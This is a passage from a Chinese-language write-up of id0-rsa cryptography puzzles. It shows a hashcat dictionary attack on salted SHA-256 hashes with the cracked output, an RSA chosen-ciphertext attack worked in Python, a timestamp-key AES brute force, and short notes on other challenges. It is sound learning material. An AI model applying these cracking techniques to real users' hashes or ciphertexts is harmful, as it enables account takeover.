class="line"></span><br><span class="line">f.close()</span><br><span class="line">w.close()</span><br></pre></td></tr></table></figure><p>然后排序输出最低最高的位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">14344391</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; st;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> st[a]&lt;st[b];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="number">0</span>); <span class="comment">//加速输入输出用，其实为了效率应该考虑用scanf/printf + char*的组合，不过也能接受了</span></span><br><span class="line">freopen(<span class="string">"rawsha256.txt"</span>, <span class="string">"r"</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">string</span> a;</span><br><span class="line"><span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a)&#123;</span><br><span class="line">st.push_back(a);</span><br><span class="line">arr[pos]=pos;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line">sort(arr,arr+<span class="number">14344391</span>,cmp);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="built_in">endl</span>&lt;&lt;arr[<span class="number">14344390</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2637658</span></span><br><span class="line"><span class="comment">//9682632</span></span><br><span class="line"><span class="comment">//--------------------------------</span></span><br><span class="line"><span class="comment">//Process exited after 67.14 seconds with return value 0</span></span><br></pre></td></tr></table></figure><p>然后找到对应单词测试一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(strings)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> str(hashlib.sha256(strings.encode()).hexdigest())</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(hash(<span class="string">"yame1bore"</span>))</span><br><span class="line"><span class="number">0000010e433</span>cfc497373957df2ea9af41ec17edc43672c413558f62d09842190</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(hash(<span class="string">"bert7quinn,3"</span>))</span><br><span class="line">fffffdaa4034dadd8b4cf8a18f92a230a92423ee24ad6dfb24adb758a8487ca2</span><br></pre></td></tr></table></figure><h1 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h1><p>多表，工具即可</p><p><a href="https://f00l.de/hacking/vigenere.php" target="_blank" rel="noopener">https://f00l.de/hacking/vigenere.php</a></p><p>成功</p><p><code>You already solved this one! Solution: BARLEY</code></p><h1 id="Monoalphabetic-Cipher"><a href="#Monoalphabetic-Cipher" class="headerlink" title="Monoalphabetic Cipher"></a>Monoalphabetic Cipher</h1><p>单表，工具解决</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p><p>成功</p><p><code>You already solved this one! Solution: c21c7f2384dabd723c6d265b1315ddb5</code></p><h1 id="Salt-Alone-Won-39-t-Save-You"><a href="#Salt-Alone-Won-39-t-Save-You" class="headerlink" title="Salt Alone Won&#39;t Save You"></a>Salt Alone Won&#39;t Save You</h1><p>暴力？字典暴力？</p><hr><p>是字典</p><p>先去hashcat了解了形式以后，写个脚本读</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, binascii</span><br><span class="line">f = open(<span class="string">"crack.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">s = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">f = open(<span class="string">"crack.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s:</span><br><span class="line">ss = ss.split(<span class="string">"$"</span>)[<span class="number">1</span>:]</span><br><span class="line">ss[<span class="number">1</span>] = ss[<span class="number">1</span>][:<span class="number">-1</span>]</span><br><span class="line">f.write(binascii.hexlify(base64.b64decode(ss[<span class="number">1</span>])).decode(<span class="string">'ascii'</span>)+<span class="string">':'</span>+ss[<span class="number">0</span>]+<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后上hashcat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">A:\Downloads\Compressed\hashcat-4.1.0</span><br><span class="line">λ hashcat64.exe -m 1410 crack.txt rockyou.txt</span><br><span class="line">hashcat (v4.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">"CL_OUT_OF_RESOURCES"</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel's OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlDeviceGetFanSpeed(): Not Supported</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) HD Graphics 530, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 7 digests; 7 unique digests, 7 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line">Minimim salt length supported by kernel: 0</span><br><span class="line">Maximum salt length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344390</span><br><span class="line">* Bytes.....: 139921496</span><br><span class="line">* Keyspace..: 14344383</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">0603ae874b416862ad705b1c42f770141b1c802fa960a5b5aa91430f04c94400:kPD)T)=~1K&#123;r:totoloco1990</span><br><span class="line">6f2da1836ac6d7c40a93da4ca9afc56fdbe7279fcd12f479aa983d495772de73:4.9.mHSbiQ]^:phuck123</span><br><span class="line">97ddc547c46af1af9821475c0b629d6a47bbfeb952535cc0afff72022459548d:b*.m,%~&amp;&lt;<span class="string">"^6:nc27360</span></span><br><span class="line"><span class="string">e91ba9f0ff28267c4af7c6976bc1e119138b76fc2cf719a06b097baec8761391:(y3]&lt;+9zmi4|:imberly1999</span></span><br><span class="line"><span class="string">573fa001661fffc3c82aeec82f16951670dc342cc071eadc8bc71a8826209b66:&#123;4[1m"</span>WqdR0s:cowmen7</span><br><span class="line">Cracking performance lower than expected?</span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password- and salt-length (typically down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Update your OpenCL runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: sha256(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">Hash.Target......: crack.txt</span><br><span class="line">Time.Started.....: Fri May 11 15:37:43 2018 (5 secs)</span><br><span class="line">Time.Estimated...: Fri May 11 15:37:48 2018 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#1.....: 11989.9 kH/s (9.69ms) @ Accel:128 Loops:1 Thr:384 Vec:1</span></span><br><span class="line">Recovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) Salts</span><br><span class="line">Progress.........: 100410681/100410681 (100.00%)</span><br><span class="line">Rejected.........: 0/100410681 (0.00%)</span><br><span class="line">Restore.Point....: 14344383/14344383 (100.00%)</span><br><span class="line">Candidates.<span class="comment">#1....: $HEX[3032313342] -&gt; $HEX[042a0337c2a156616d6f732103]</span></span><br><span class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 63c Util: 50% Core:1151MHz Mem:2505MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Fri May 11 15:37:31 2018</span><br><span class="line">Stopped: Fri May 11 15:37:48 2018</span><br></pre></td></tr></table></figure><p>排序输入得到答案</p><h1 id="CCA-on-Textbook-RSA"><a href="#CCA-on-Textbook-RSA" class="headerlink" title="CCA on Textbook RSA"></a>CCA on Textbook RSA</h1><p>RSA的选择密文攻击。</p><p>假设爱丽丝创建了密文 $C=P^emodn$并且把 $C$ 发送给鲍勃，同时假设我们要对爱丽丝加密后的任意密文解密，而不是只解密 $C$，那么我们可以拦截$ C$，并运用下列步骤求出 $P$：</p><ol><li>选择任意的 $X∈Z^∗_n$，即 $X$ 与 $N$ 互素</li><li>计算 $Y=C×X^emod n$</li><li>由于我们可以进行选择密文攻击，那么我们求得 $Y$ 对应的解密结果 $Z=Y^d$</li><li>那么，由于 $Z=Y^d=(C×X^e)^d=C^dX=P^{ed}X=PXmodn$，由于 $X$ 与 $N$ 互素，我们很容易求得相应的逆元，进而可以得到 $P$</li></ol><hr><p>于是先读公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">λ openssl rsa -pubin -<span class="keyword">in</span> pubkey.pem -text -modulus</span><br><span class="line">Public-Key: (2048 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:a9:a9:60:8d:4b:d1:be:ee:e3:ce:11:51:cc:2d:</span><br><span class="line">    1a:72:b8:76:df:63:e4:9f:70:aa:c8:da:e5:04:f5:</span><br><span class="line">    91:7c:aa:f7:9f:5a:16:ae:5a:0b:8f:c2:e5:59:b6:</span><br><span class="line">    46:8f:b4:9b:64:8d:02:96:6e:a2:30:03:f2:08:d7:</span><br><span class="line">    56:b6:31:11:2d:86:ae:85:5e:04:82:e7:df:db:d5:</span><br><span class="line">    e9:0d:06:d5:6b:58:12:36:db:9a:9b:d5:24:2f:2e:</span><br><span class="line">    ca:82:b5:c2:f9:52:88:50:ad:be:78:b7:d1:83:e2:</span><br><span class="line">    b1:ee:3b:2e:89:f2:45:33:9e:88:04:67:40:a0:d0:</span><br><span class="line">    50:49:f5:76:a3:7a:ca:a9:45:0c:51:c7:7c:f5:b5:</span><br><span class="line">    ba:85:e5:72:39:c2:a0:55:8e:eb:a1:f0:e6:06:7a:</span><br><span class="line">    d3:b9:c6:50:08:7b:6b:35:ea:72:eb:8a:c6:8c:00:</span><br><span class="line">    5d:4a:38:a4:c7:d8:d4:0c:b2:91:59:4a:83:21:ff:</span><br><span class="line">    6c:08:78:81:2a:65:9a:83:59:f7:67:65:<span class="built_in">cd</span>:55:97:</span><br><span class="line">    15:96:ec:20:1a:30:63:8f:39:c5:23:08:5e:13:c7:</span><br><span class="line">    55:9d:07:22:44:ea:70:df:84:f3:7b:a8:13:19:51:</span><br><span class="line">    76:<span class="built_in">fc</span>:62:c7:58:63:78:38:3f:5a:52:93:b0:3f:54:</span><br><span class="line">    43:26:5d:f8:e7:50:5f:27:9f:e5:60:6d:36:bc:f1:</span><br><span class="line">    47:f9</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqalgjUvRvu7jzhFRzC0a</span><br><span class="line">crh232Pkn3CqyNrlBPWRfKr3n1oWrloLj8LlWbZGj7SbZI0Clm6iMAPyCNdWtjER</span><br><span class="line">LYauhV4Eguff29XpDQbVa1gSNtuam9UkLy7KgrXC+VKIUK2+eLfRg+Kx7jsuifJF</span><br><span class="line">M56IBGdAoNBQSfV2o3rKqUUMUcd89bW6heVyOcKgVY7rofDmBnrTucZQCHtrNepy</span><br><span class="line">64rGjABdSjikx9jUDLKRWUqDIf9sCHiBKmWag1n3Z2XNVZcVluwgGjBjjznFIwhe</span><br><span class="line">E8dVnQciROpw34Tze6gTGVF2/GLHWGN4OD9aUpOwP1RDJl3451BfJ5/lYG02vPFH</span><br><span class="line">+QIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">λ python</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.1</span> (v3<span class="number">.6</span><span class="number">.1</span>:<span class="number">69</span>c0db5, Mar <span class="number">21</span> <span class="number">2017</span>, <span class="number">17</span>:<span class="number">54</span>:<span class="number">52</span>) [MSC v<span class="number">.1900</span> <span class="number">32</span> bit (Intel)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n =<span class="number">0xA9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="number">0x912fcd40a901aa4b7b60ec37ce6231bb87783b0bf36f824e51fe77e9580ce1adb5cf894410ff87684969795525a63e069ee962182f3ff876904193e5eb2f34b20cfa37ec7ae0e9391bec3e5aa657246bd80276c373798885e5a986649d27b9e04f1adf8e6218f3c805c341cb38092ab771677221f40b72b19c75ad312b6b95eafe2b2a30efe49eb0a5b19a75d0b31849535b717c41748a6edd921142cfa7efe692c9a776bb4ece811afbd5a1bbd82251b76e76088d91ed78bf328c6b608bbfd8cf1bdf388d4dfa4d4e034a54677a16e16521f7d0213a3500e91d6ad4ac294c7a01995e1128a5ac68bfc26304e13c60a6622c1bb6b54b57c8dcfa7651b81576fc</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pow(x,<span class="number">0x10001</span>,n)*c%n</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(d)</span><br><span class="line"><span class="string">'0x5eff6db089a86b058bbfd34f01cbe256fc9cc5b18c0999bd215048f8ca3de6f3250191417e502ea15aac5c7cf167c9be60944361163b13b96b1262dfc4bcbd695a61dcedd74192d9bfc5c0b9c8399cba3f6e6fc9f4adaf6d65b0594c696a32ab53913c06be6de9ee68b030b0aaef65bec0cbec7ad2439057cf30f7cd083138f98be11e93e54168acbc4bacb6b87b0a4a3d84e761f58e7605a0ae01b72c1344e96d7c5401be91bbe78a3527672c073c4c355ee340a1d2ea5d178c31c40561bccfb9ef47e0c984bd8227a187f492489b0292b506edf992950c009b59d2093b43f5601affa6b5b0b39a4b848c654ad242c55e62b358c03d91f889e7ab5e5d7e7f02'</span></span><br></pre></td></tr></table></figure><p>提到网站去，得到<code>1395d5d50ae8d8e24572a393c628b3c4b335a30298b305d396e8b2a388e302d602a245d3c4e4a8e335990a88e5a302a5a30478de8244b36305690938b512d32</code></p><p>求$3^{-1}modn$，最后计算得到明文<code>0x687474703a2f2f6172636869762e696e667365632e6574687a2e63682f656475636174696f6e2f667330382f73656373656d2f4d616e67657230312e706466</code></p><h1 id="AES-CTR-with-Nonce-Reuse"><a href="#AES-CTR-with-Nonce-Reuse" class="headerlink" title="AES-CTR with Nonce Reuse"></a>AES-CTR with Nonce Reuse</h1><p>就是Two-Time-Pad攻击咯</p><hr><h1 id="Bad-Entropy"><a href="#Bad-Entropy" class="headerlink" title="Bad Entropy"></a>Bad Entropy</h1><p>就是爆破咯</p><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">c = binascii.unhexlify(<span class="string">"a99210d796a1e37503febf65c329c1b2"</span>)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1453651200</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">1454169600</span>:</span><br><span class="line">    s = md5(str(i).encode()).hexdigest()</span><br><span class="line">    s = binascii.unhexlify(s)</span><br><span class="line">    cipher = AES.new(s, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher.decrypt(c).decode(<span class="string">'ascii'</span>)</span><br><span class="line">        print(cipher.decrypt(c))</span><br><span class="line">        a = input()</span><br><span class="line">        <span class="keyword">if</span> int(a) == <span class="number">0</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>爆破成功，密钥时间是<code>1453862488</code></p><h1 id="Rainbow-Table-Hash-Chain"><a href="#Rainbow-Table-Hash-Chain" class="headerlink" title="Rainbow Table Hash Chain"></a>Rainbow Table Hash Chain</h1><p>直觉告诉我hashcat可解</p><hr><h1 id="Elliptic-Curve-Private-Key-Recovery"><a href="#Elliptic-Curve-Private-Key-Recovery" class="headerlink" title="Elliptic Curve Private Key Recovery"></a>Elliptic Curve Private Key Recovery</h1><p>貌似是公钥选得腊鸡？但是我需要复（yu）习一下ECC</p><hr><h1 id="ECDSA-Nonce-Recovery"><a href="#ECDSA-Nonce-Recovery" class="headerlink" title="ECDSA Nonce Recovery"></a>ECDSA Nonce Recovery</h1><p>同上</p><hr><h1 id="Double-Strength-Affine"><a href="#Double-Strength-Affine" class="headerlink" title="Double Strength Affine"></a>Double Strength Affine</h1><p>直觉告诉我，暴力依然可以解</p><hr><h1 id="Slightly-harder-passwords"><a href="#Slightly-harder-passwords" class="headerlink" title="Slightly harder passwords"></a>Slightly harder passwords</h1><p>Twitter上有hint，直觉告诉我说hashcat可以解决</p><hr><h1 id="Upgraded-Affine"><a href="#Upgraded-Affine" class="headerlink" title="Upgraded Affine"></a>Upgraded Affine</h1><p>这个的CBC需要考虑一下子了</p><hr><h1 id="Fvtavat-Xrl-Erpbirel"><a href="#Fvtavat-Xrl-Erpbirel" class="headerlink" title="Fvtavat Xrl Erpbirel"></a>Fvtavat Xrl Erpbirel</h1><p>印象里是RSA，慢慢来把</p><hr><h1 id="Insufficient-Key-Size"><a href="#Insufficient-Key-Size" class="headerlink" title="Insufficient Key Size"></a>Insufficient Key Size</h1><p>这题这么水还放这么后面……yafu/factordb秒解好吧</p><p>都懒得写WP了……看到这里还不会的可以退群了（明示【误</p><h1 id="Hastad-39-s-Broadcast-Attack"><a href="#Hastad-39-s-Broadcast-Attack" class="headerlink" title="Håstad&#39;s Broadcast Attack"></a>Håstad&#39;s Broadcast Attack</h1><p>RSA广播攻击诶，好嗦</p><hr><h1 id="CBC-Padding-Attack"><a href="#CBC-Padding-Attack" class="headerlink" title="CBC Padding Attack"></a>CBC Padding Attack</h1><p>标题明示，我要慢慢学习去</p><h1 id="Breaking-PDF-Passwords"><a href="#Breaking-PDF-Passwords" class="headerlink" title="Breaking PDF Passwords"></a>Breaking PDF Passwords</h1><h1 id="Vigenere-Rail-Fence"><a href="#Vigenere-Rail-Fence" class="headerlink" title="Vigenère + Rail Fence"></a>Vigenère + Rail Fence</h1><p>手动一个个试，然后得到密钥是<code>21，trader</code></p><img src="/id0-rsa-WP合集/1525698998368.png" title="Vigenère + Rail Fence"><h1 id="Recover-the-secret-phone-number"><a href="#Recover-the-secret-phone-number" class="headerlink" title="Recover the secret phone number"></a>Recover the secret phone number</h1><p>这题还是比较有意思的</p><p>首先很明显是一个base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">λ python</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.1</span> (v3<span class="number">.6</span><span class="number">.1</span>:<span class="number">69</span>c0db5, Mar <span class="number">21</span> <span class="number">2017</span>, <span class="number">17</span>:<span class="number">54</span>:<span class="number">52</span>) [MSC v<span class="number">.1900</span> <span class="number">32</span> bit (Intel)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">"H4sIAIq6o1cAAy2QS5OiMBSF9/yaIDrVLnrRQfJS000gAbILhCJAUMryMfrrB6tndRf3u+ecexR2nuLQNxF3eiU7u0IvitWtitimIcLrGEamFGdKxNmUx64hqq+xHyi++jZbd3JSQx1p3/QQBAbLBWCznRDQGbzocuws/ug0VkNz8g8br/fxKO51b8Ei+GwzCOon7JuTevNTHbFhmcBg/woo3t704qCWhM0kT80TurqHvir5rEv6TrpZmNDG7wP1fLNFsQ0p5m9uMsVmpNiDQ3feB4cMXA9ZGAtpWd7DVEl2zOSxy4DSvzuwz6WLLBCikPOhDmdmiB7yEQkhWSwlSqrSwsUUBtnkYF4yYxJdfOPHJc2VaPF2rkox1IPjlVep9VAJoJzuZtJOi8aKsQa7hEdfF0H4VO/4TxbZW6B2ycbsPMyIpy2+Si7/mpzwtUX6zndfoRmT1/4FYROKix05q4mjQvE/sbdeK9cLUN3b0X3LhIWBJLBKw5kuL5CjfDyKUnkl5cYixESCRCrp/n8VKB/TTiIV54nf0eSKit8arnH3+Rn8A9M9NCIXAgAA"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> 